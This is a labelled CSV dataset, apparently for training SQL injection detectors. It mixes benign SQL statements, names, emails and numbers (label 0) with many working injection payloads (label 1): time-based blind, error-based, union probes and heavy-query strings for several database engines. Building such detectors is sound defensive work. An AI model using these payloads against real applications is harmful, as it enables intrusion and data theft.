Query,Label
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",1
-5021'+  (  select yadq where 4285  =  4285 order by 1#,1
" SELECT * FROM they ORDER BY ask ASC, mine DESC",0
SELECT church FROM field UNION ALL SELECT model FROM watch ORDER BY joy,0
"-3126   )    )    union all select 6718,6718,6718,6718,6718--",1
"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 12389 )  ORDER BY meta_id ASC",0
SELECT * FROM yourself WHERE favorite NOT LIKE '[farmer]%',0
"1'  )   where 6489  =  6489 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
8.64151E+15,0
5.9335E+15,0
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1
SELECT * FROM journey,0
valcourt,0
"1""  )   where 5719  =  5719 rlike sleep  (  5  )  --",1
SELECT * FROM pretty,0
28413,0
SELECT AVG ( owner ) FROM discover SELECT SUM ( here ) ,0
"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""alkz""  =  ""alkz",1
77232447b,0
lauze,0
 UPDATE airplane SET question = 'first'WHERE basket = 'colony',0
"1'||  (  select 'oxam' from dual where 7162  =  7162 and make_set  (  8403  =  8403,8899   )    )   ||'",1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",1
3.07402E+15,0
FROM  ( SELECT DISTINCT term FROM river ) ,0
1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',1
"  SELECT examine,coffee FROM short WHERE aside = 'notice' UNION SELECT triangle, nor FROM sets",0
jochim@ajuntamentdebarcelona2-0.qa,0
SELECT * FROM fuel FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM told,0
geldres pittaluga,0
"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
end and    (    (   'pfrt'  =  'pfrt,1
mairozio,0
FROM  ( SELECT DISTINCT century FROM supply ) ,0
"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1"" union all select null,null,null,null,null,null,null,null#",1
"   SELECT COUNT ( forget ) , appearance FROM say BY flame",0
"1"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1  )   as kjsd where 1670  =  1670 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
chirlern,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28705 )  ORDER BY meta_id ASC",0
1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,1
1'   )    )    as bswc where 1635  =  1635 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
select   (  case when   (  7019  =  1998  )   then 7019 else 7019*  (  select 7019 from mysql.db  )   end  )  #,1
9.84is22nte334c799,0
SELECT * FROM find WHERE Price NOT BETWEEN 10 AND 20,0
DELETE FROM near WHERE concerned = 'music',0
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,1
"1""   )    )     )   order by 1#",1
foulk@eonon.com.es,0
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'ykjs' like 'ykjs,1
dieasl_yannatos@vilainstal.coop,0
1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',1
"SELECT ADDDATE ( ""2017-06-15 09:34:21"", INTERVAL -3 HOUR ) ;",0
" SELECT CustomerName, Address + ', ' + PostalCode + ' ' + City + ', ' + Country AS Address  FROM Customers;",0
SELECT AVG ( successful ) FROM ride,0
"aaiun, 122 12?f",0
"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,1
SELECT TAN ( -3 ) ;,0
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""tbbk"" like ""tbbk",1
SELECT * FROM would FETCH FIRST 50 PERCENT ROWS ONLY,0
"iif  (  6307  =  2459,1,1/0  )  ",1
"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'ppwh'  =  'ppwh",1
UNION ALL SELECT,1
SELECT MAX (  column_name  )  FROM table_name WHERE condition ;,0
3772,0
"  SELECT * FROM brush WHERE surrounded NOT IN  ( 'log', 'form', 'every' )  ",0
1%'  )   and 4061  =  2730#,1
"1%"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
3118,0
SELECT * FROM introduced WHERE next = 'swung' FETCH FIRST 3 ROWS ONLY,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",1
2.81517E+15,0
"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1' where 1836  =  1836 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
6ilia+ria,0
SELECT * FROM hung WHERE fire = 'studied' LIMIT 3,0
05072293b,0
c,1
SELECT * FROM pen WHERE NOT curious = 'vessels'  AND NOT willing = 'thought',0
"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",1
"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1
SELECT * FROM practice WHERE afternoon = 'father'  AND  ( wash = 'creature' OR correct = 'yellow' ) ,0
"1"" where 7371  =  7371 waitfor delay '0:0:5'--",1
"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""smhd"" like ""smhd",1
SELECT * FROM open ORDER BY telephone,0
"1%"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1
SELECT * FROM peace WHERE outline = 'scared' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM range WHERE syllable = 'sides',0
9.4488E+15,0
declare @q nvarchar   (  4000  )   select @q   = ,1
balcells parets,0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'zaes'  =  'zaes,1
" SELECT * FROM stiff ORDER BY dollar, steady",0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",1
diy$ambo,0
SELECT * FROM model WHERE    NOT mail = 'exactly',0
SELECT * FROM fly FETCH FIRST 3 ROWS ONLY,0
SELECT flag FROM directly UNION ALL SELECT combination FROM swim ORDER BY triangle,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239190 )  ORDER BY meta_id ASC",0
SELECT * FROM seeing WHERE there BETWEEN '1996-07-01' AND '1996-07-31',0
racette,0
"  SELECT * FROM heard WHERE above NOT IN  ( 'add', 'native', 'writing' )  ",0
kangning,0
"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --",1
SELECT * FROM clothing WHERE shaking BETWEEN which09/01/1996plate AND meant15/31/1996lie,0
"-5362  )   union all select 7297,7297,7297,7297,7297#",1
"-2953""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""oaeh""  =  ""oaeh",1
8363,0
"1""  )   where 5129  =  5129 order by 1--",1
SELECT AVG ( imagine ) FROM directly,0
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'dkra' like 'dkra",1
FROM  ( SELECT DISTINCT most FROM earth ) ,0
SELECT cutting ( s )  FROM other,0
6aq408tro,0
slezak@ballerpoker.kn,0
"INSERT INTO him ( kitchen, waste, triangle, half, pool, shore )  VALUES  ( 'managed', 'name'. living', 'library', 'cell', 'told', 'stems' )  ",0
SELECT * FROM experiment WHERE height = 'other'  AND City = 'red',0
"  SELECT instance,myself,loose FROM world LEFT JOIN Orders ON disease.harderID =  eaten.affect ORDER BY enough.lucky",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 175 )  ORDER BY meta_id ASC",0
15lo956i1o,0
lotera,0
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",1
SELECT AVG ( cat )  FROM traffic  SELECT SUM ( percent ) ,0
aventino,0
"1%""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,1
saunder,0
SELECT wait FROM such,0
"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",1
"-8256""   )    )     )   or 6872  =  6872 and    (    (     (  ""lrtu""  =  ""lrtu",1
"1""   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
 UPDATE course SET manner = 'above'WHERE force = 'turn',0
"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""lsca"" like ""lsca",1
"1'||  (  select 'rfjl' where 2476  =  2476 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1
2252,0
"  SELECT * FROM go WHERE mental IN  ( 'writer', 'me', 'fellow' )  ",0
hi or a  =  a,1
DELETE FROM world,0
"1  )   where 9213  =  9213 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1""  )   as ikdo where 4128  =  4128",1
halpin,0
or ''  =  ',1
reski.kuberskaya@n340magazin.no,0
SELECT * FROM with WHERE way NOT BETWEEN 'must' AND 'heading',0
e2paq48t282r,0
"1'||  (  select 'yhkt' from dual where 7105  =  7105 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'",1
SELECT * FROM poem WHERE stage = 'happen' LIMIT 3,0
hoeflich@movil-google.cx,0
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'toft'  =  'toft",1
SELECT TOP 3 * FROM ear SELECT * FROM about 3SELECT * FROM badly,0
yarela,0
1%'  )   or sleep  (  5  )   and   (  '%'  =  ',1
"-6815 where 7609  =  7609 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",1
SELECT create ( s )  FROM original SELECT worried FROM eventually,0
"1""  )   as awdg where 9512  =  9512",1
"1   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM mostly WHERE thought = 'got'  AND City = 'say',0
SELECT * FROM sound 3 SELECT * FROM river,0
5498,0
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe",1
SELECT * FROM soil FETCH FIRST 3 ROWS ONLY,0
chicle,0
SELECT * FROM check ORDER BY anything DESC,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 348623 )  ORDER BY meta_id ASC",0
SELECT * FROM your WHERE shape BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT COUNT ( tooID ) FROM carried,0
"   SELECT include, eaten, solidFROM die WHERE partly  IS NOT NULL",0
8.23106E+15,0
"-9934""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""xecb"" like ""xecb",1
solonitsin3@neotelecom.fi,0
SELECT COUNT ( DISTINCT say )  FROM blind,0
termmetro,0
SELECT * FROM simply FETCH FIRST 3 ROWS ONLY,0
"1' where 1673  =  1673 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
els,0
sidonio,0
-3083  )   or 5221  =  7829,1
vargas bentos,0
delit@icods.ro,0
"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1
"-2222' in boolean mode  )   union all select 7649,7649,7649,7649,7649,7649,7649,7649--",1
SELECT * FROM running WHERE    NOT rocky = 'involved',0
SELECT * FROM attention FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM hay,0
kangelis,0
"1""  )   where 7723  =  7723 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
98946031p,0
"   SELECT Employees.halfway, COUNT ( Orders.laborID )  AS passFROM    ( OrdersINNER JOIN enjoy ON Orders.forgetID  =  Employees.dependID ) ",0
SELECT TOP 50 PERCENT * FROM walk,0
SELECT * FROM sing WHERE Price NOT BETWEEN 10 AND 20,0
"   SELECT sent,join,enjoy,putting,vast     (  (  average JOIN extra ON visit.good =  dust.higher )   INNER JOIN shownON Orders.till =  example.steadyID ) ",0
"   SELECT COUNT ( coal ) , sink FROM act BY several",0
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
SELECT * FROM finish FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM shop,0
"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""tfso""  =  ""tfso",1
SELECT plastic ( s )  FROM six,0
SELECT * FROM knowledge WHERE left NOT LIKE 'composed%',0
7118,0
"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'ekla'  =  'ekla",1
"1' in boolean mode  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1%'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   '%'  =  '",1
"select * from generate_series  (  7724,7724,case when   (  7724  =  8170  )   then 1 else 0 end  )   limit 1--",1
SHOW FULL COLUMNS FROM `wp_options`,0
SELECT * FROM keep 3,0
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'hbld'  =  'hbld",1
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
SELECT TOP 3 * FROM CustomersWHERE Country = 'Germany';,0
SELECT continent ( s ) FROM ice INNER JOIN,0
